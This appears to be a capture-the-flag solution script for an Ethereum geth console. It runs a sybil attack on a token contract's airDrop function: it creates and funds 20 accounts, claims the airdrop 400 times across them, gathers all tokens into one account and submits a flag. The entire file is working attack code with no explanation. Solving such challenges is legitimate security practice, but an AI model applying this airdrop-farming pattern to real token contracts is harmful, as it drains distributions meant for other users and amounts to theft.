// author: polaris

for(var i=0;i<20;i++){
    personal.importRawKey(addrs[i],"");
}

for(var i=0;i<20;i++){
    personal.unlockAccount(eth.accounts[i+2],"",100000);
}

personal.unlockAccount(eth.accounts[1],"",100000);
for(var i=0;i<20;i++){
    eth.sendTransaction({from:eth.accounts[1], to:eth.accounts[i+2], value: web3.toWei(0.1, "ether")});
}


for(var j=0;j<20;j++){
    for(var i=0;i<20;i++){
        metacoin.airDrop({from:eth.accounts[i+2]});
    }
}

var sum=0;
for(var i=0;i<20;i++){
    console.log(+metacoin.balance(eth.accounts[i+2]));
}

var token = 0;
for(var i=0;i<20;i++){
    token = (+metacoin.balance(eth.accounts[i+2]));
    if(token!=0){
        metacoin.transfer(eth.accounts[1],token,{from:eth.accounts[i+2]});
    }
}

console.log(+metacoin.balance(eth.accounts[1]));
metacoin.CaptureTheFlag("Znp0Znp0Znp0Znp0QGdtYWlsLmNvbQ==",{from:eth.accounts[1]});







